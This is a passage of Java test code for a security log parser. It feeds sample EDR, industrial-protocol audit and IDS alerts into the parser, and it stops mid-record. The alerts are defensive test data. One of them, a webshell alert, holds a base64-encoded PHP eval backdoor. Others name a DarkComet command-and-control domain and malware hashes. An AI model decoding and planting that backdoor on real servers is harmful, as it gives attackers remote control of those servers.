  public void testEpsSangforEdr() {
    String parserFile = "./resources/parsers/edr_sangfor_edr[3.2.21.375]_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<165>Sep 14 16:49:01 sangfor EDR.[26566]: nofile_attack : [{\"_id\":\"E2BFFDCFB49F1433946989208A2C4FB364ADC400\",\"threat_name\":\"powershell\\u811a\\u672c\\u6267\\u884c\",\"found_time\":1600073099,\"time\":1600073284,\"state\":\"\\u653e\\u884c\\u6210\\u529f\",\"agent_id\":\"2252151801\",\"event_type\":\"\\u9ad8\\u7ea7\\u5a01\\u80c1\",\"host_name\":\"MBX02\",\"iplist\":\"10.254.1.174\"}]\n";
      parse(botuEngine, data);
      data = "<165>Sep 14 16:49:01 sangfor EDR.[26566]: virus : [{\"_id\":\"00C7F26DD403F40EFD6F3C10A41D7F48779783FA\",\"file_md5\":\"DD4D4BB7928FBD32721D63FC3E522377\",\"virus_name\":\"Trojan.Win32.Save.a\",\"risk_level\":1,\"create_time\":1626678821,\"state\":\"\\u672a\\u5904\\u7406\",\"time\":1626924411,\"found_time\":1626924303,\"agent_id\":\"4223091653\",\"file_path\":\"c:\\\\windows\\\\temp\\\\dig.exe\",\"threat_file\":\"Trojan.Win32.Save.a\",\"virus_type\":\"\\u6728\\u9a6c\\u75c5\\u6bd2\"}]";
      parse(botuEngine, data);
      data = "<165>Sep 14 16:49:01 sangfor EDR.[26566]: anti_bfa : [{\"_id\":\"3cc80fa5d351a2a7c793729c83835a35a8565b4c\",\"found_time\":1626902415,\"att_src\":\"10.122.18.149\",\"agent_id\":\"899059639\",\"att_times\":300,\"state\":\"\\u672a\\u5904\\u7406\",\"time\":1626934105,\"event_type\":\"\\u66b4\\u529b\\u7834\\u89e3\"}]";
      parse(botuEngine, data);
      data = "<165>Sep 14 16:49:01 sangfor EDR.[26566]: Webshell : [{\"_id\":\"091ecd0cda03c04637532bdc77c396b70d480f69\",\"time\":1626942264,\"file_path\":\"c:\\\\wamp\\\\www\\\\0a63198e7335d5537a243237b6fdf0a4.php\",\"threat_file\":\"Backdoor.PHP.Webshell.l\",\"file_md5\":\"0a63198e7335d5537a243237b6fdf0a4\",\"host_name\":\"WIN-UDN216RMU63(10.122.103.33)\",\"state\":\"\\u672a\\u5904\\u7406\",\"agent_id\":\"4027493573\",\"found_time\":1626942264,\"event_type\":\"WebShell\"}]";
      parse(botuEngine, data);
      data = "<165>Sep 14 16:49:01 sangfor EDR.[26566]: blscan : [{\"task_state_desc\":\"\\u68c0\\u67e5\\u5b8c\\u6210\",\"time\":1626934548,\"total_items\":31,\"unmatch_items\":19,\"agent_id\":\"656200623\",\"iplist\":\"10.122.118.4\",\"host_plat\":2,\"system\":\"Windows 10 Pro  x64\",\"alias\":\"DESKTOP-E7361E2\",\"zone_name\":\"\\u672a\\u5206\\u7ec4\\u7ec8\\u7aef\",\"_id\":\"60f90d0fe138230c5b4594b5\",\"event_type\":\"\\u57fa\\u7ebf\\u68c0\\u6d4b\"}]";
      parse(botuEngine, data);
      data = "<165>Sep 14 16:49:01 sangfor EDR.[26566]: leak : [{\"found_time\":1626925784,\"agent_id\":\"619632694\",\"update_time\":1626925406,\"state\":\"\\u5f85\\u5904\\u7406\",\"risk_level\":\"\\u9ad8\\u5a01\\u80c1\",\"patch_name\":\"\\u7528\\u4e8e x64 \\u7cfb\\u7edf\\u7684 Windows 7 \\u548c Windows Server 2008 R2 SP1 \\u4e0a\\u7684 Microsoft .NET Framework 3.5.1 \\u7684\\u5b89\\u5168\\u66f4\\u65b0\\u7a0b\\u5e8f (KB2656356)\",\"patch_url\":\"http:\\/\\/download.windowsupdate.com\\/msdownload\\/update\\/software\\/secu\\/2011\\/12\\/windows6.1-kb2656356-x64_01b0f5428ef6eb2782e6f2c617f06fba8bbf4460.cab\",\"zone_name\":\"\\u672a\\u5206\\u7ec4\\u7ec8\\u7aef\",\"ip\":\"200.200.24.55,200.200.24.56\",\"_id\":\"ED61836909ED39DF4BB98979F00B115DEF6FEEF2\"}]";
      parse(botuEngine, data);
      data = "<165>Sep 14 16:49:01 sangfor EDR.[26566]: flux : [{\"_id\":{\"$oid\":\"60f9351a53de43781d57d1fd\"},\"a\":\"DESKTOP-IALKGLT\",\"b\":\"\\u9ed8\\u8ba4\\u4e92\\u8054\\u7f51\",\"c\":\"10.122.118.5\",\"d\":\"C:\\/Windows\\/System32\\/svchost.exe -k utcsvc -p\",\"e\":\"-\",\"f\":\"40.74.108.123\",\"g\":443,\"h\":\"tcp\",\"i\":\"https(tcp:443)\",\"j\":\"\\u9ed8\\u8ba4\\u51fa\\u7ad9\\u7b56\\u7565\",\"k\":\"\\u5141\\u8bb8\",\"s\":1512980701958032,\"t\":\"-\",\"u\":\"agent\",\"v\":\"local_ip\",\"l\":1626945394,\"o\":\"899059639\",\"p\":\"0\",\"q\":\"-\",\"r\":\"-\",\"m\":99,\"srv_type\":\"0\",\"srv_id\":\"1512980701958032\"}]";
      parse(botuEngine, data);
      //跟客户样本不一致
/*      data = "<165>Sep 14 16:49:01 sangfor EDR.[26566]: Botnet : [{\"_id\":\"02409a8073a23b7d3d6bf5d5509f88f9c4771d5b\",\"agent_id\":\"4027493573\",\"domain_name\":\"gs001.edrt.com\",\"file_path\":\"c:\\\\users\\\\administrator\\\\desktop\\\\botnetsimtool\\\\x64\\\\childproc\\\\test_67zxqw.exe\",\"time\":1626942368,\"found_time\":1626912766,\"file_count\":2,\"unhandle_file_count\":2,\"state\":0}]";
      parse(botuEngine, data);*/
      data = "<165>Sep 14 16:49:01 sangfor EDR.[26566]: Botnet : [{\"state\":\"\\u672a\\u5904\\u7406\",\"found_time\":1565936091,\"time\":1565936091,\"threat_file\":\"TR\\/Spy.Zbot.lperys\",\"agent_id\":\"2845273670\",\"file_md5\":\"3cefc234e2070dee2b077579bfa31a2e\",\"file_path\":\"c:\\\\users\\\\administrator\\\\desktop\\\\\\u62db\\u5546\\u5c40\\u6d4b\\u8bd5\\u6848\\u4f8b\\u6240\\u9700\\u6837\\u672c\\uff08\\u4e00\\uff09\\\\\\u62db\\u5546\\u5c40\\u6d4b\\u8bd5\\u6848\\u4f8b\\u6240\\u9700\\u6837\\u672c\\uff08\\u4e00\\uff09\\\\\\u52d2\\u7d22\\u75c5\\u6bd2\\\\3cefc234e2070dee2b077579bfa31a2e\",\"event_type\":\"\\u50f5\\u5c38\\u7f51\\u7edc\",\"host_name\":\"DESKTOP-2B22E70\",\"iplist\":\"10.62.3.41\"}]";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //天融信审计系统
  public void testAuditTopsecTopIAS() {
    String parserFile = "./resources/parsers/audit_topsec_topias[3.2294.3770.1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"TopsecOS\" dev_ip=\"10.56.65.250\" time=\"2021-07-06 17:46:35\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4016.1_ida\" s_eid=\"21070617463500089439\" i_srcport=\"3888\" i_dstport=\"20000\" s_srcmac=\"10:60:4b:6e:9b:7a\" s_dstmac=\"00:90:0b:41:73:69\" i_srcip=\"192.168.83.167\" i_dstip=\"192.168.102.24\" i_logtime=\"1625564795\" i_ipproto=\"6\" s_protocol=\"DNP3\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-0d48520a\" i_dnp3_link_sour=\"3\" i_dnp3_link_dest=\"4\" i_dnp3_app_func=\"1\" i_dnp3_app_iin=\"0\" s_dnp3_app_object=\"66048\" s_dnp3_app_data=\"\" s_dnp3_briefly=\"功能:读,源方站地址:3,副方站地址:4,内部状态:无,请求组别变体:二进制输入事件,响应组别变体:\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"TopsecOS\" dev_ip=\"10.56.65.250\" time=\"2021-07-06 17:52:47\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4016.1_ida\" s_eid=\"21070617524700090011\" i_srcport=\"49058\" i_dstport=\"44818\" s_srcmac=\"00:e0:ed:22:79:f2\" s_dstmac=\"1c:a8:75:13:a2:01\" i_srcip=\"71.6.135.131\" i_dstip=\"221.206.153.193\" i_logtime=\"1625565167\" i_ipproto=\"6\" s_protocol=\"EthernetIP\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-0d48520a\" i_cip_object=\"99\" i_cip_service=\"99\" i_cip_attr_vendor_id=\"799\" i_cip_attr_dev_type=\"0\" i_cip_attr_pro_code=\"21\" i_cip_attr_vision=\"296\" i_cip_attr_status=\"0\" i_cip_attr_number=\"0\" i_cip_o_net_conn_id=\"\" i_cip_t_net_conn_id=\"\" i_cip_conn_ser_num=\"\" i_cip_orig_ser_num=\"\" i_cip_attr_enc_ver=\"1\" s_cip_brief_introduction=\"使用 Identity 控制命令(命令值：99), 发送 List Identity 服务命令(控制值：99), 获取控制点位设备的属性信息:一 封装版本 1, 二 供应商 Delta Power Electronics Center, 三 设备类型 Generic Device (deprecated), 四 供应商产品码 21, 五 版本 1.40, 六 设备状态信息 (1)所有者ID:0; (2)是否开箱即用:否; (3)扩展设备状态一:自我测试; (4)自身不存在可恢复问题; (5)自身不存在不可恢复问题; (6)自身不存在重大可恢复故障; (7)自身不存在重大不可恢复故障; (8)扩展设备状态二:自我测试。 七 控制点位设备的序列号 00000000, 八 产品标识 DVP12SE, 九 端口号 44818, 十 终端IP 192.168.1.9。\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"TopsecOS\" dev_ip=\"10.56.65.250\" time=\"2021-07-06 17:52:59\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4016.1_ida\" s_eid=\"21070617525901090198\" i_srcport=\"10088\" i_dstport=\"2404\" s_srcmac=\"10:60:4b:6a:71:e9\" s_dstmac=\"6c:3b:e5:0e:93:db\" i_srcip=\"192.168.83.170\" i_dstip=\"192.168.83.168\" i_logtime=\"1625565179\" i_ipproto=\"6\" s_protocol=\"IEC104\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-0d48520a\" i_iec104_asdu_causetx_req=\"6\" i_iec104_asdu_typeid_req=\"100\" i_iec104_asdu_addr=\"1\" s_iec104_ioa_req=\"0; \" s_iec104_ioa_value_req=\"站总召唤; \" s_iec104_asdu_causetx_res=\"\" s_iec104_asdu_typeid_res=\"\" s_iec104_ioa_res=\"\" s_iec104_ioa_value_res=\"\" s_decm_briefly_str=\"I(0,0),激活:站(总)召唤命令,asdu地址:1,信息体地址:0,(当前请求未完成响应);\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"TopsecOS\" dev_ip=\"10.56.65.250\" time=\"2021-07-06 17:47:21\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4016.1_ida\" s_eid=\"21070617472101089676\" i_srcport=\"47016\" i_dstport=\"102\" s_srcmac=\"00:00:00:00:00:00\" s_dstmac=\"00:00:00:00:00:00\" i_srcip=\"127.0.0.1\" i_dstip=\"127.0.0.2\" i_logtime=\"1625564841\" i_ipproto=\"6\" s_protocol=\"IEC61850_MMS\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-0d48520a\" i_mms_service_type=\"4\" s_mms_objectName_domainId=\"simpleIOGenericIO\" s_mms_objectName_itemId=\"GGIO1$MX$AnIn1$mag$f\" s_mms_data_value_data=\"-0.397601\" s_mms_FC=\"MX(测量)\" s_decm_briefly_str=\"读simpleIOGenericIO/GGIO1$MX$AnIn1$mag$f,读到的值为:-0.397601\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"TopsecOS\" dev_ip=\"10.56.65.250\" time=\"2021-07-06 17:53:59\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4016.1_ida\" s_eid=\"21070617535900090073\" i_srcport=\"4554\" i_dstport=\"502\" s_srcmac=\"a0:8c:fd:d7:fb:a4\" s_dstmac=\"00:0c:29:b3:86:05\" i_srcip=\"192.168.102.63\" i_dstip=\"192.168.102.64\" i_logtime=\"1625565239\" i_ipproto=\"6\" s_protocol=\"Modbus\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-0d48520a\" i_modbus_trans_id=\"195\" i_modbus_proto_id=\"0\" i_modbus_len=\"6\" i_modbus_unit_id=\"1\" i_modbus_func_code=\"3\" i_modbus_read_starting_addr=\"0\" i_modbus_write_stating_addr=\"0\" s_modbus_coil_val=\"\" s_modbus_reg_val=\"0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\" s_packet_type=\"匹配响应\" s_modbus_exception_code=\"\" s_decm_briefly_str=\"(0x03)读保持寄存器 寄存器数量:50 起始地址:0 寄存器值:0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0字节数:100 \" s_modbus_input=\"寄存器数量:50 起始地址:0 \" s_modbus_output=\"寄存器值:0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0字节数:100 \" i_modbus_error_id=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"TopsecOS\" dev_ip=\"10.56.65.250\" time=\"2021-07-06 17:53:14\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4016.1_ida\" s_eid=\"21070617531401090223\" i_srcport=\"33822\" i_dstport=\"62550\" s_srcmac=\"64:51:06:5a:54:c3\" s_dstmac=\"dc:4a:3e:76:aa:4d\" i_srcip=\"192.168.102.57\" i_dstip=\"192.168.102.54\" i_logtime=\"1625565194\" i_ipproto=\"6\" s_protocol=\"OPCUA\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-0d48520a\" i_secure_channel_id=\"3\" i_token_id=\"1\" s_packet_type=\"匹配响应\" i_request_func=\"428\" s_request_param=\"终端URL: opc.tcp://d0049-lsl:62550/Quickstarts/HistoricalAccessServer 地区设置列表: Transport Profile列表的终端: \" i_response_func=\"431\" s_response_param=\"终端URL: opc.tcp://localhost:62550/Quickstarts/HistoricalAccessServer 应用URI: urn:D0049-LSL:Quickstart Historical Access Server 产品URI: http://opcfoundation.org/UASDK/HistoricalAccessServer 地址名称: Quickstart Historical Access Server;应用类型:服务器;安全模式:需要签名且要加密;安全等级:3;\" s_decm_briefly_str=\"调用请求方法GetEndpoints_request(查找服务器所支持的终端)调用响应方法GetEndpoints_response(服务器所支持的终端列表)\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"TopsecOS\" dev_ip=\"10.56.65.250\" time=\"2021-07-06 17:54:05\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4016.1_ida\" s_eid=\"21070617540501090276\" i_srcport=\"1025\" i_dstport=\"34964\" s_srcmac=\"00:0c:29:98:81:9d\" s_dstmac=\"00:0c:29:98:81:93\" i_srcip=\"13.10.20.39\" i_dstip=\"13.10.10.72\" i_logtime=\"1625565245\" i_ipproto=\"17\" s_protocol=\"Profinet\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-0d48520a\" i_pro_operation=\"3\" s_pro_block_type=\"8008\" s_pro_addr=\"1\" s_pro_data=\"IOD写入响应:ARUUID:c3454581-227a-4547-99f2-9fde06080000,API:0X00000000,槽:0X0,子槽:0X1,索引:用户特定记录数据,状态:成功; \" s_pro_briefly=\"操作:写,块类型:IOD写入响应,数据:IOD写入响应:ARUUID:c3454581-227a-4547-99f2-9fde06080000,API:0X00000000,槽:0X0,子槽:0X1,索引:用户特定记录数据,状态:成功; \"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"16\" dev_name=\"TopsecOS\" dev_ip=\"10.56.65.250\" time=\"2021-07-06 17:53:36\" index=\"502\" recorder=\"TAW\" version=\"V3.2294.4016.1_ida\" s_eid=\"21070617533600090042\" i_srcport=\"51533\" i_dstport=\"102\" s_srcmac=\"68:8f:84:00:71:08\" s_dstmac=\"00:50:56:95:28:3b\" i_srcip=\"192.168.19.106\" i_dstip=\"172.19.26.18\" i_logtime=\"1625565216\" i_ipproto=\"6\" s_protocol=\"Siemens_S7\" s_protocolgroup=\"工控物联网\" i_warninglevel=\"6\" s_devid=\"c9c2da94-f768-11c0-bbd8-0d48520a\" i_s7comm_func=\"1025\" i_s7comm_szl_id=\"17\" s_s7comm_address=\"\" s_s7comm_cla_pi_server=\"\" s_s7comm_cla_data=\"6ES7 315-2EH14-0AB0 ,6ES7 315-2EH14-0AB0 ,模块固件版本:V3.2.6,Boot Loader 版本:32.9.9\" i_s7comm_cla_error=\"0\" s_s7comm_cla_briefly=\"组功能:系统,子功能:读取系统状态列表, 系统状态ID:模块标识\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //奇安信天眼
  public void testIdsQianxinSkyeve() {
    String parserFile = "./resources/parsers/ids_qianxin_skyeve[3.0.9.0]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "2018-05-14 15:10:52|!10.91.4.13|!log|![{\"name\": \"空闲CPU百分比太低\", \"value\": 19.7},{\"name\": \"15分钟平均CPU负载太高\", \"value\": 35.1}]";
      parse(botuEngine, data);
      data = "2019-09-17 16:59:14|!10.91.3.13|!webids-ids_dolog|!{\"intranet_rule_all\": null,\"ids_rule_version\": \"1.0\", \"cnnvd_id\": \"\", \"description\": \"1\", \"appid\": 77,\"packet_data\":\"UE9TVCAvbXVzaWNoYWxsL2ZjZ2ktYmluL2ZjZ19pbXVzaWNfZ2V0X3BpYy5mY2cgSFRUUC8xLjENCkhvc3Q6IDExNi4xMjguMTM0LjE3Mw0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNClVzZXItQWdlbnQ6IFFRJUU5JTlGJUIzJUU0JUI5JTkwLzY2NzcyIENGTmV0d29yay85NzguMC43IERhcndpbi8xOC43LjAgKHg4Nl82NCkNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IHpoLWNuDQpDb250ZW50LUxlbmd0aDogNjUwDQpSZWZlcmVyOiBodHRwOi8veS5xcS5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KDQoKPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHJvb3Q+CiAgPHVpZD4xMzUyODQxODU1PC91aWQ+CiAgPHNpZD4yMDE5MDkxNzE1NTgxMzEzNTI4NDE4NTU8L3NpZD4KICA8Y3Y+NjAxMDY8L2N2PgogIDxjdD42PC9jdD4KICA8T3BlblVESUQ+Y2Q5ZGJiZDJkZjgxOTgxMDVhYWU2ZjNkMmUwNDkwNzQ1YzliZDRkMDwvT3BlblVESUQ+CiAgPHVkaWQvPgogIDxuZXR0eXBlPjI8L25ldHR5cGU+CiAgPGVubz4xMC4xNC42PC9lbm8+CiAgPGNpZD4yMjY8L2NpZD4KICA8cXE+MDwvcXE+CiAgPHVpbj4wPC91aW4+CiAgPHB3ZC8+CiAgPG10PmlNYWMxNCwyPC9tdD4KICA8Y2hpZD4xPC9jaGlkPgogIDxqc29uPjE8L2pzb24+CiAgPGNobG9naW5zdHlsZT4wPC9jaGxvZ2luc3R5bGU+CiAgPHYvPgogIDxhdXRoc3QvPgogIDxhdXRoLz4KICA8cGF1dGgvPgogIDx3aWQ+NjczNzcwNjEyMDA2MTQ3Njg2NDwvd2lkPgogIDxpdGVtPgogICAgPGd0PjA8L2d0PgogICAgPGdsPjEwMzU4MDQyOTwvZ2w+CiAgICA8aW5mbzE+NVpDYjVZMi82TDZlPC9pbmZvMT4KICAgIDxpbmZvMj42Wit6NmFLUjVvQ3E1NG1wPC9pbmZvMj4KICAgIDxpbmZvMz41WkNiNVkyLzZMNmU8L2luZm8zPgogICAgPHB0PjA8L3B0PgogIDwvaXRlbT4KPC9yb290PgoNCkhUVFAvMS4xIDIwMCBPSw0KU2VydmVyOiBuZ2lueA0KRGF0ZTogVHVlLCAxNyBTZXAgMjAxOSAwODo1MToxMyBHTVQNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtDQpDb250ZW50LUxlbmd0aDogMzgzDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpVVUlEOiAxMjQ0Njg4NzQwDQpQcmFnbWE6IG5vLWNhY2hlDQpBcmVhOiBzaA0KDQoK\",\"xff\": null, \"kill_chain\": \"0x02010000\", \"rule_name\": \"Shell命令执行(机器学习)\",\"webrules_tag\": \"1\", \"attack_result\": \"0\", \"victim\": \"116.128.134.173\", \"dport\": 80,\"bulletin\": \"后端服务器语言中，严禁执行shell命令\", \"sport\": 50246, \"affected_system\":\"\", \"attack_type\": \"代码执行\", \"confidence\": 50, \"sip\": \"172.24.18.57\", \"severity\": 6,\"protocol_id\": 6, \"attack_method\": \"远程\", \"attack_flag\": \"true\", \"kill_chain_all\": \"入侵:0x02000000|漏洞探测:0x02010000\", \"detail_info\": \"通过机器学习方式，检测到访问中存在shell命令执行攻击代码。shell命令执行攻击是危害极高的攻击形式，攻击成功可以造成服务器被控制。\", \"attacker\": \"172.24.18.57\", \"packet_size\": 1612, \"info_id\": \"\",\"attack_type_all\": \"攻击利用:16000000|代码执行:16030000\", \"serial_num\":\"QbJK/dnbo\", \"sig_id\": 117440516, \"write_date\": 1568710271, \"victim_type\":\"server\", \"vuln_type\": \"代码执行\", \"dip\": \"116.128.134.173\", \"rule_id\": 17553}";
      parse(botuEngine, data);
      data = "2019-09-17 16:59:14|!10.91.3.13|!webids-webattack_dolog|!{\"referer\": \"\",\"vuln_name\": \"发现敏感目录探测行为\", \"file_name\": \"ZHdzeW5jLnhtbA==\", \"agent\":\"\", \"uri\": \"/about/_notes/dwsync.xml\", \"attack_result\": \"0\", \"victim\": \"39.106.48.21\",\"host\": \"oracle.www.finesun.com.cn\", \"sport\": 49867, \"attack_type\": \"敏感信息/重要文件泄漏\", \"confidence\": 50, \"sip\": \"172.24.243.171\", \"severity\": 6, \"rsp_body_len\": 0,\"vuln_harm\": \"如果这些名称敏感的目录中包含了危险的功能或信息，恶意攻击者有可能利用这些脚本或信息直接获取目标服务器的控制权或基于这些信息实施进一步的攻击。\",\"kill_chain_all\": \"入侵:0x02000000|漏洞探测:0x02010000\", \"detail_info\": \"攻击者正在探测服务器上是否存在敏感名称的目录。如/admin、/conf、/backup、/db等这些目录中有可能包含了大量的敏感文件和脚本， 如服务器的配置信息或管理脚本等。\",\"intranet_rule_all\": null, \"rsp_content_type\": \"\", \"public_date\": \"2012-01-0100:00:00\", \"code_language\": \"通用\", \"parameter\": \"\", \"method\": \"GET\", \"rule_name\":\"发现敏感目录探测行为\", \"req_header\": \"GET /about/_notes/dwsync.xmlHTTP/1.1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110Safari/537.36\\r\\nHost: oracle.www.finesun.com.cn\\r\\nAccept: */*\\r\\nAccept-Encoding: gzip, deflate\\r\\n\\r\\n\", \"rsp_status\": 404, \"xff\": \"\", \"kill_chain\":\"0x02010000\", \"vuln_type\": \"敏感信息/重要文件泄漏\", \"webrules_tag\": \"1\",\"dolog_count\": 1, \"write_date\": 1568710212, \"site_app\": \"通用\", \"attacker\":\"172.24.243.171\", \"victim_type\": \"server\", \"attack_flag\": \"true\", \"solution\": \"如果这些目录中包含了敏感内容，请删除这些目录，或者正确设置权限，禁止用户访问。\",\"rsp_content_length\": 0, \"vuln_desc\": \"攻击者正在探测服务器上是否存在敏感名称的目录。 如/admin、/conf、/backup、/db等这些目录中有可能包含了大量的敏感文件和脚本，如服务器的配置信息或管理脚本等。\", \"rule_version\": 1, \"attack_type_all\": \"攻击利用:16000000|信息泄露:16160000\", \"serial_num\": \"QbJK/dnbo\", \"rsp_body\": \"\",\"rsp_header\": \"HTTP/1.1 404 Not Found\\r\\nServer: Apache-Coyote/1.1\\r\\nContent-Length: 0\\r\\nDate: Tue, 17 Sep 2019 08:50:14 GMT\\r\\n\", \"dport\": 8081, \"cookie\": \"\",\"req_body\": \"\", \"dip\": \"39.106.48.21\", \"rule_id\": 268567872}";
      parse(botuEngine, data);
      data = "2019-09-17 16:59:14|!10.91.3.13|!webids-ioc_dolog|!{\"rule_desc\": \"DarkKomet远控木马活动事件\", \"campaign\": \"\", \"packet_data\": \"UNoA8ePmnAYbAGPWCABFAABMZABAAH0RAnCsGAYM3wYGBuxfADUAOJ10LJsBAAABAAAAAAABCXIxZTByMTk3cgVuby1pcANiaXoAAAEAAQAAKQ+gAACAAAAA\", \"dns_arecord\": \"\",\"tproto\": \"udp\", \"tag\": null, \"malicious_family\": \"DarkKomet\", \"ioc_type\": \"host\",\"sport\": 60511, \"attack_type\": \"远控木马\", \"sip\": \"172.24.6.12\", \"severity\": 7, \"proto\":\"dns\", \"kill_chain_all\": \"命令控制:0x03000000|命令控制服务器连接:0x030a0000\",\"filename\": \"\", \"etime\": \"2017-12-04 12:00:17\", \"dns_type\": 0, \"platform\":[\"Windows\"], \"rule_state\": \"green\", \"tid\": 2, \"attack_type_all\": \"恶意软件:14000000|远控木马:14080000\", \"type\": \"远控木马\", \"targeted\": false, \"access_time\":1568710064000, \"nid\": \"5782621921543767683\", \"file_md5\": \"\", \"kill_chain\": \"c2\",\"offence_value\": \"172.24.6.12\", \"host\": \"r1e0r197r.no-ip.biz\", \"victim_ip\":\"172.24.6.12\", \"attack_ip\": \"\", \"xff\": null, \"desc\": \"DarkKomet是一种运行于Windows系统下的恶意程序，其诞生于2008年，又称“暗黑彗星”木马，是国外有名的后门类木马。2016年7月数据显示 DarkComet是按恶意网络协议分类后最为活跃的木马，该木马以最新版本的变种为主，服务器主要分布在土耳其和俄罗斯。 细节： 1.执行大量的恶意行为，包括记录上传用户输入的密码， 摄像头的内容等隐私信息。根据服务器的指令执行下载文件、启动程序、运行脚本等控制操作。以被控制的计算机作为跳板，对其它目标发起DDoS等网络攻击。 2.木马在使用恶意网络协议与 C&C服务器进行通信的过程中，收发的网络数据包之中包含明显特征， IDTYPE 握手包 SERVER 握手确认包 GetSIN 请求机器信息infoes 发送机器信息 QUICKUP 传输文件 DESKTOPCAPTURE 捕捉屏幕 GETMONITORS请求显示器信息 #KEEPALIVE# 心跳包 4.使用动态域名，以“ddns.net”和“duckdns.org”为主，占比超过了50%。 5.土耳其是DarkComet相关C&C服务器数量最多的国家， 占到总量的30.2%，其次是俄罗斯和美国。\", \"xml_confidence\": \"high\",\"offence_type\": \"sip\", \"file_direction\": null, \"file_content\": null, \"uri\": \"\",\"current_status\": \"inactive\", \"ioc_source\": 0, \"ioc_value\": \"r1e0r197r.no-ip.biz\",\"serial_num\": \"QbJK/dnbo\", \"dport\": 53, \"dip\": \"223.6.6.6\", \"malicious_type\": \"远控木马\"}";
      parse(botuEngine, data);
      data = "2019-09-02 19:12:49|!10.91.3.13|!webids-webshell_dolog|!{\"write_date\":1567422213, \"victim\": \"172.26.47.224\", \"xff\": 127.0.0.1, \"file_md5\":\"fa804a363447f0d5f95bdc31df9baed6\", \"kill_chain\": \"0x06040000\", \"attacker\":\"180.102.222.135\", \"host\": \"2.2.2.2\", \"attack_result\": \"2\", \"file\":\"PD9waHAgZXZhbCgkX1BPU1RbYmpkeXNtXSk_Pg==\", \"attack_desc\": \"攻击者企图上传一个后门文件。 后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序。该后门文件通过调用PHP函数eval来直接执行黑客传入的数据（一般是一段代码），实现对服务器的操作和控制。\", \"sport\": 2965, \"attack_type\": \"HTTP代理程序\",\"confidence\": 80, \"sip\": \"180.102.222.135\", \"severity\": 8, \"file_dir\": \"upload\",\"rule_name\": \"中国菜刀变形.A\", \"url\": \"/dvwa/vulnerabilities/upload/\", \"victim_type\":\"server\", \"attack_flag\": \"true\", \"kill_chain_all\": \"痕迹清理:0x06000000|凭据清理:0x06040000\", \"detail_info\": \"攻击者企图上传一个后门文件。后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序。 该后门文件通过调用PHP函数eval来直接执行黑客传入的数据（一般是一段代码），实现对服务器的操作和控制。\",\"serial_num\": \"tester/sensor\", \"attack_type_all\": \"攻击利用:16000000|webshell上传:161C0000\", \"dport\": 23614, \"attack_harm\": 